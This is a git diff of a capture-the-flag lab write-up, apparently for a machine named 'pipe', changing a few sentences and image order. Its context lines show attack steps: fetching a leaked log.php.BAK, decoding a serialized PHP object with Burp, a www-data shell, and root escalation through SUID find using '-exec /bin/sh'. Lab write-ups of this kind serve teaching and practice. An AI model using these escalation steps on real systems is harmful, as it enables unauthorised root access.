@@ -116,7 +116,7 @@ We have file listing.
 ![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-13-53-12.png)
 
 `php.js` is for the definition of a function `serialize()` used on `index.php`.<br>
-log.php.BAK is for `Log` class.
+On the other hand, log.php.BAK is for `Log` class.
 ```php:log.php.BAK
 root@kali:~# curl http://192.168.0.3/scriptz/log.php.BAK
 <?php
@@ -151,8 +151,8 @@ class Log
 
 Using Burp Suite, we can see the content of the hidden webpage on GUI.<br>
 It is just a simple website with one hyperlink. Clicking the link shows us an interesting HTTP POST request with parameter.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-36.png)
 ![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-48.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-36.png)
 
 Using Burp Decoder, we can decode the parameter.<br>
 It's a PHP object of `Info` class.
@@ -197,6 +197,7 @@ www-data@pipe:/var/www/html/scriptz$
 ```
 
 ## 3. Getting Root
+
 By taking a look at `/etc/crontab`, we can find that 
 1. `/root/create_backup` is running in every minutes.
 2. `/usr/bin/compress.sh` is running in every 5 minutes as `root` user.
@@ -266,7 +267,7 @@ ls -l /usr/bin/find
 -rwsr-xr-x 1 root root 233984 Nov  9  2014 /usr/bin/find
 ```
 
-Since `find` has
+Since `find` has `-exec` option, we can execute `/bin/sh` as root user.
 ```shell
 www-data@pipe:/home/rene/backup$ find backup.tar.gz -exec "/bin/sh" \;
 find backup.tar.gz -exec "/bin/sh" \;
